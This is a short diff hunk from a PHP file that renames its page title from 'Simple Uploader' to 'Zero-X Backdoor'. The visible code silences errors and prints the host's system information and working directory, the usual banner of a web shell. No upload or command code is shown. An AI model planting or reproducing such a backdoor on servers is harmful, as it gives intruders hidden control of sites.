@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-echo '<title>Simple Uploader</title><style>
+echo '<title>Zero-X Backdoor</title><style>
 body{background-color:#000020;color:#e1e1e1;}</style>
 <font style="Arial"><font color="red"><center><b><br><br>'.php_uname().'</b><br>
 <font style="Arial"><font color="red"><center><b><br><br>Directory: '.getcwd().' <br></b><br>
